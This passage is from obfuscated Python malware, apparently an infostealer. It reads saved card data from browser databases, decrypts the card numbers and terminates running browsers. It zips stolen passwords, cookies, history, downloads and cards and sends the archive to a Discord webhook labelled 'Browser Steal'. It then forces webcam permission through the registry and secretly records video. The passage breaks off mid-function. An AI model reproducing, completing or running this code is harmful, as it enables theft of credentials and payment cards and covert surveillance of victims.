        disk_conn = sqlite3.connect(DTSWWWOISETNXXYLLTSNYDFIXPQNWPKYYNCETHHYEDPAEUPELVQFOGZTIIXLRMIJLY)
        disk_conn.backup(QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN)
        disk_conn.close()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ = QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.cursor()
        JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in JRTDGZIZXSNSLRQQCQKPXVNQDTEKBJTBQXVFBGCRBYVLKQWZQOZLBHMDFPSBQOYGJEUFSODYIQPZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ =             f"- Name             : {v4r_row[0]}"
            YAPQQNUDTHNHZVBQSSCGQPGPSOJQNWSSZUSSSXXWHXQAKKQGZWBTUN = f"  Expiration Month : {v4r_row[1]}"
            ZQZRHSJKCXOPENAWIQLXMSCUEFXKBIROQUBAFJDMRHMBEAAIEMHXDHYWIANLKMLZ =  f"  Expiration Year  : {v4r_row[2]}"
            FLXHMACHHDDOODHFCWZJYXQKXSRATRNBRRLFCTWKXJYKSEMJTYXZSZKSYIMHSVK =      f"  Card Number      : {UCAQXCUKNZITJPNDAVPSNLJZVQZQNICPJKLXONRQTBNYLMZSEACESTGVRLJLLAARKYTDOARQRFCNQKVDMMWDQBTPRANNWJKTBWHQ(v4r_row[3], NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU)}"
            EMZAZGYICQVMBEXPSHNDBZPHTECDHOINCFWNSGGRAWXKUUYKIWPZPMXB =    f"  Date Modified    : {v4r_row[4]}"
            KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name =     f"  Browser          : {KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB}"
            AGSFZGCLCUZORPQCDRNRYISKBSGCCRIJRSUJPHIKPRLSRGKQMSELTWMNKW.append(f"{XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ}\n{YAPQQNUDTHNHZVBQSSCGQPGPSOJQNWSSZUSSSXXWHXQAKKQGZWBTUN}\n{ZQZRHSJKCXOPENAWIQLXMSCUEFXKBIROQUBAFJDMRHMBEAAIEMHXDHYWIANLKMLZ}\n{FLXHMACHHDDOODHFCWZJYXQKXSRATRNBRRLFCTWKXJYKSEMJTYXZSZKSYIMHSVK}\n{EMZAZGYICQVMBEXPSHNDBZPHTECDHOINCFWNSGGRAWXKUUYKIWPZPMXB}\n{KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB_name}\n")
        
        QHXQRCPSRDWPLNDATGPMYTHNKNCVHWRYIYQQRDPWUMLKXRYAACEIATUSGNIKEEJVSPWOOGTTMDBQAHZLN.close()

    def SUYZKWOKGTFPNRGCRGTKWEXAEGAWRKDWNPNBYAXDBXHSKLUGYFWCUXEIWCVFWCEVGWOQWZY(HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX):
        files_in_memory = {}

        if BZNMLSTVQWQVIBDJQQQGBDVQLTROPMZEXDKXDOVQNHCCJSUCMLZHFMOSRXICUQPZHHKUFON:
            files_in_memory[f"Passwords_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt"] = '\n'.join(BZNMLSTVQWQVIBDJQQQGBDVQLTROPMZEXDKXDOVQNHCCJSUCMLZHFMOSRXICUQPZHHKUFON)

        if AJQOFARZPGUNIFDJQLUAUBLMYNPOFUARQPCQZXLKJITSITSVGJQKDEWWZTLLIRNOVY:
            files_in_memory[f"Cookies_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt"] = '\n'.join(AJQOFARZPGUNIFDJQLUAUBLMYNPOFUARQPCQZXLKJITSITSVGJQKDEWWZTLLIRNOVY)

        if SJYEKDCOMARMSWJAXAWSVFOQGDRQHDCXHOUAOWTKQGQGCDTXSEZTPCISTJBTKBIRLKTQZKSEGVXYSPWZWZJECRDQKHM:
            files_in_memory[f"History_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt"] = '\n'.join(SJYEKDCOMARMSWJAXAWSVFOQGDRQHDCXHOUAOWTKQGQGCDTXSEZTPCISTJBTKBIRLKTQZKSEGVXYSPWZWZJECRDQKHM)

        if NNMLOWKYMLLTYYDJVHZYFXTGEGTWHHUBAMIHKLCQCUSZNXOQJAOHUCLSSCGXAUDRFXDHKUGOHVLSQHMKJKM:
            files_in_memory[f"Downloads_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt"] = '\n'.join(NNMLOWKYMLLTYYDJVHZYFXTGEGTWHHUBAMIHKLCQCUSZNXOQJAOHUCLSSCGXAUDRFXDHKUGOHVLSQHMKJKM)

        if AGSFZGCLCUZORPQCDRNRYISKBSGCCRIJRSUJPHIKPRLSRGKQMSELTWMNKW:
            files_in_memory[f"Cards_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt"] = '\n'.join(AGSFZGCLCUZORPQCDRNRYISKBSGCCRIJRSUJPHIKPRLSRGKQMSELTWMNKW)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def BYDIJDBCPKSNISVPLYUTAKBTEOYHKYPDLRAFGDFZZFOMBFQVZTKW(HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX, zip_in_memory):
        WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ = SyncWebhook.from_url(MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX)
        WLHRXEDAGMBMGRJWJZWIOUWHVZXPPWSJTJLUPJPLTXBBPYHLJIQ.send(
            embed=Embed(
                title=f'Browser Steal {SSKHZDLRNGSSIMEUEDTUYTPURKATDZYJIBJGYNZNNMJLTOXPPOGSXUNCIJDJNVKUXFNUNEFTOOGEGIMFZRVSMYXMRBUQPQPROB}:',
                description=f"Found In **{'**, **'.join(RDJZNUWNQXXDBTELFBZCMVISJQTEAEADCCROLRIRFOFDFYUJECMMKPURKX)}**: ```📂 - Browser_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.zip\n├── 📄 - Cards_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt\n├── 📄 - Cookies_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt\n├── 📄 - Downloads_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt\n├── 📄 - History_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt\n└── 📄 - Passwords_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.txt```",
                color=DNELUTIPWJOZTULOMFHJWJJZAFVXALFGOVGTTHOTYCMNDYPADROGVNVBFJXRN,
            ).set_footer(
                text=VESUBNJMUJUISETCMMULDLVANAOHCUJNNPPZZGWNXHHOWJTLXDHVREXNPRYKFTLEOQRIDGRTNFKWSHEYECXVDJMQ,
                icon_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.zip"), 
            username=LMRAEHHWDRLRJFXVQBVICRAQPOCOVBBOLNBRUAOGUGDKOMAHPTNYFEGZRVQDWHXOVMUFXGZRSUEBDCIH, avatar_url=CXSOUFNGUAAONNKBBBLJRFERXZPMOFCYLKEMUHOPOGMLRNLRIPXXCQYJOXGIFSDYVEGZHPXSUNOXI
        )
        
    DYPPZLOITRALILWQDXQEPPPJFNZNRRRJIAGDULJZVXHHTETNTAHJALNL = {
        'Google Chrome': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Amigo', 'User Data'),
        'Torch': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Torch', 'User Data'),
        'Kometa': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(DRRMPYMVSGBKKULGVFOEMUPKBLZMHUROHFJFHJZGNQFYRVJAASXUGGSJEDYRGWAOPUHBFTWUXEQYUBQCXTZQNZAELNOXGRDEA, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(RBSDCZDAGTWTUDQFXILSLKUPJMRJSYHWKJFIKFCBPQEEFKHSVGJTTE, 'Apple Computer', 'Safari'),
    }

    DYPPZLOITRALILWQDXQEPPPJFNZNRRRJIAGDULJZVXHHTETNTAHJALNL_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    QBFKENJXSEBJBESBHJXLCEQOQDGYPVPVZEDCNYZWWMSRRBUUQWUQWATEUFGZSKBFBKSBABHQEEUMKCKMQTB = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in DYPPZLOITRALILWQDXQEPPPJFNZNRRRJIAGDULJZVXHHTETNTAHJALNL_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG in DYPPZLOITRALILWQDXQEPPPJFNZNRRRJIAGDULJZVXHHTETNTAHJALNL.items():
        if not os.path.exists(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG):
            continue

        NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU = WUQSGLSEJEDQENBHHOBLAIETSREYKLDAKZDSUFAPPBVMGANDXASOGDHSCKZQCPPTRNHLKZRYVDOLQVNYBVSFTEHYKBA(os.path.join(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG, 'Local State'))
        if not NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU:
            continue

        for v4r_profile in QBFKENJXSEBJBESBHJXLCEQOQDGYPVPVZEDCNYZWWMSRRBUUQWUQWATEUFGZSKBFBKSBABHQEEUMKCKMQTB:
            UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP = os.path.join(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG, v4r_profile)
            if not os.path.exists(UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP):
                continue
            
            try: RSHHKOVUYAKOLGCFMCLZQPFCCCPRVVKSXFMCFPKCKWHWUIWBNDHBIYRYURLZSIEZLNGSUPYIXATZBK(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU)
            except: pass
            try: LURSOUZGTHNVCPXRHWSFYEXDIQVUEEFNWAXIQHHSPQOXGSWJQDCMKDYQRDMTJZMMCIPWJVGOCEXKCCBYLKR(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU)
            except: pass
            try: YXHAZVVFLPTZFKNRVBPOCSMENSRRYBKIXXLWRPYVYGBSCXWVHHWLTFJ(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP)
            except: pass
            try: BNHLXPKYKQCWGSOPPNVPDRSTSVYLWGCELZKNBQAHKMGYDFMUPFKIVOEPYJFGTSWEYXFEXMXDMZWILRKYUHRDPAPODIEKJQHCQNXC(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP)
            except: pass
            try: PVNDBWKXHPFJPIVTDUUOXMGNOLCNREPIMIXLFUFWWNHGBSLSJXZFMRJKSHLDLXUWNXXMBSOLJYFRENT(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB, UJAGVFFGZLUOMXQXXPRYGZHAYDRLSJHVDKOINXRLOBXSRORYVKROIWZYP, NMNVJJNDGSKSOFRJWRDKHOVTZEQZCVOWETHYZWYPJHWXPTSGROIXPEHWEBHPAHNFZXBU)
            except: pass

            if KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB not in RDJZNUWNQXXDBTELFBZCMVISJQTEAEADCCROLRIRFOFDFYUJECMMKPURKX:
                RDJZNUWNQXXDBTELFBZCMVISJQTEAEADCCROLRIRFOFDFYUJECMMKPURKX.append(KUZAFJBYWYQUQTUUJMUIPPGYZODLRIGYMUBGHVIVSWSPJZVVVSRUIYLEHAJOOCELGPNFQCUTBCIEXMUERGDOIWSFSIXSWCUB)
            
    if not BZNMLSTVQWQVIBDJQQQGBDVQLTROPMZEXDKXDOVQNHCCJSUCMLZHFMOSRXICUQPZHHKUFON:
        BZNMLSTVQWQVIBDJQQQGBDVQLTROPMZEXDKXDOVQNHCCJSUCMLZHFMOSRXICUQPZHHKUFON.append("No passwords was saved on the victim's computer")
    if not AJQOFARZPGUNIFDJQLUAUBLMYNPOFUARQPCQZXLKJITSITSVGJQKDEWWZTLLIRNOVY:
        AJQOFARZPGUNIFDJQLUAUBLMYNPOFUARQPCQZXLKJITSITSVGJQKDEWWZTLLIRNOVY.append("No cookies was saved on the victim's computer")
    if not SJYEKDCOMARMSWJAXAWSVFOQGDRQHDCXHOUAOWTKQGQGCDTXSEZTPCISTJBTKBIRLKTQZKSEGVXYSPWZWZJECRDQKHM:
        SJYEKDCOMARMSWJAXAWSVFOQGDRQHDCXHOUAOWTKQGQGCDTXSEZTPCISTJBTKBIRLKTQZKSEGVXYSPWZWZJECRDQKHM.append("No history was saved on the victim's computer")
    if not NNMLOWKYMLLTYYDJVHZYFXTGEGTWHHUBAMIHKLCQCUSZNXOQJAOHUCLSSCGXAUDRFXDHKUGOHVLSQHMKJKM:
        NNMLOWKYMLLTYYDJVHZYFXTGEGTWHHUBAMIHKLCQCUSZNXOQJAOHUCLSSCGXAUDRFXDHKUGOHVLSQHMKJKM.append("No downloads was saved on the victim's computer")
    if not AGSFZGCLCUZORPQCDRNRYISKBSGCCRIJRSUJPHIKPRLSRGKQMSELTWMNKW:
        AGSFZGCLCUZORPQCDRNRYISKBSGCCRIJRSUJPHIKPRLSRGKQMSELTWMNKW.append("No card was saved on the victim's computer")

    zip_in_memory = SUYZKWOKGTFPNRGCRGTKWEXAEGAWRKDWNPNBYAXDBXHSKLUGYFWCUXEIWCVFWCEVGWOQWZY(HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX)
    BYDIJDBCPKSNISVPLYUTAKBTEOYHKYPDLRAFGDFZZFOMBFQVZTKW(HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX, zip_in_memory)

def BFMLKABPJZDBIAAFITQXFHRBTDIKJUSKPTMACGWMOZLYPNBAXPRSDSGXBSVDUFLDBZLFDGBPLVCPNRKKUFALJPNHOLHVCXWNOV():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime
    import winreg
    from datetime import datetime

    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore" + r'\webcam', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Value', 0, winreg.REG_SZ, 'Allow')
            winreg.CloseKey(key)
        except: pass
        XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ_file_capture = f"CameraCapture_{HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX}.avi"

        def C4ptur3(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture):
            GGUVWUOXKJASCRPXOZDLJAYXXKQLVXZRDOSEIZMDHBHPRRBFVJOMZVLTND_capture = 15
            ANTQXUERZQKYPINMKYZSYRWOKVOKFKAIIBQFVZGYYQYPEHOYYUEPQGJEZZ = cv2.VideoCapture(0)

            if not ANTQXUERZQKYPINMKYZSYRWOKVOKFKAIIBQFVZGYYQYPEHOYYUEPQGJEZZ.isOpened():
                ZEFKEPHCWNGPRDHOOWOELDAGUPJKLPIQPOJPNPNXFHKGMVAPPGXRTZHIUIRPVSMKQASQULINKBDGSF()
                NSOGKUFJECAHAHGZSSJSSQWJIKNVJHYQGCLUHVTPZWQBGZGOMPOKNROLOZNHXIWC(
                    MMYEKZMRKBSJGZQBUCBLHWMRTMRCPCRTXUGBXUXZYEJYSRERZMQKDCEHHEVWCBCVBIHTDQQVKHX, 
                    title=f'Camera Capture {HZZPWNZVJHVZVNEQTTEAHPFNCGCFORNVVJAZNZKMHHPLZTJHRQETJTMGUBEUGPPVKJNNCQVAFJLSEQACKNSLOLGCVHX} "{YKQCOOZPWSWEUWYGMNCVFYKYFCBHHNFUIYMZJDPHBSAACEUZZSTXZBXEPJDRQSECHZYJFC}":', 
                    description=f"No cameras found."
                )
                status = "exit"
                return status
            
            TBVFBKQTFPZBACGSUAORTVBXNIYDSATRIAFFCNQOPNPNJODTUWJBKQIADLNBZSARENPCNFXKHSWHUVXIWBYVHATGBVUOJXG = cv2.VideoWriter_fourcc(*'XVID')
            EZJCAEASPSKQHWAEDEQCMUSEPAGEIZSTIFDCNMVGAVCIHYRTRIGKTEOXWDBMZLNJNRJPZHLSAQHYNXIQOWOG = cv2.VideoWriter(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture, TBVFBKQTFPZBACGSUAORTVBXNIYDSATRIAFFCNQOPNPNJODTUWJBKQIADLNBZSARENPCNFXKHSWHUVXIWBYVHATGBVUOJXG, 20.0, (640, 480))
            GGUVWUOXKJASCRPXOZDLJAYXXKQLVXZRDOSEIZMDHBHPRRBFVJOMZVLTND_start = datetime.now()
            while (datetime.now() - GGUVWUOXKJASCRPXOZDLJAYXXKQLVXZRDOSEIZMDHBHPRRBFVJOMZVLTND_start).seconds < GGUVWUOXKJASCRPXOZDLJAYXXKQLVXZRDOSEIZMDHBHPRRBFVJOMZVLTND_capture:
                v4r_ret, v4r_frame = ANTQXUERZQKYPINMKYZSYRWOKVOKFKAIIBQFVZGYYQYPEHOYYUEPQGJEZZ.read()
                if not v4r_ret:
                    break
                EZJCAEASPSKQHWAEDEQCMUSEPAGEIZSTIFDCNMVGAVCIHYRTRIGKTEOXWDBMZLNJNRJPZHLSAQHYNXIQOWOG.write(v4r_frame)

            ANTQXUERZQKYPINMKYZSYRWOKVOKFKAIIBQFVZGYYQYPEHOYYUEPQGJEZZ.release()
            EZJCAEASPSKQHWAEDEQCMUSEPAGEIZSTIFDCNMVGAVCIHYRTRIGKTEOXWDBMZLNJNRJPZHLSAQHYNXIQOWOG.release()
            status = None
            
            return status

        try:
            QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture = os.path.join(YBWLZVZPEIIQADQGYQDEXLDFYRYTOHDAMSXBGKOCMCKNBLNEPYBXCQR, 'Documents', XMVERBMXSTGUQSLVWJUTQRLPTCVOKVRUBYSCZECBLFALAIIAXUVCRWGTRKUEEYRSPRJHEBUNVSHJUVGZ_file_capture)
            status = C4ptur3(QXGTTNXDUHJVZRUXGWQONZBTULHNSXSQSRLDURXKGUBMNDDWWESYVAGKKCOTAKGFGCMCAFTYAYDDMRHYBSLRJG_file_capture)
        except:
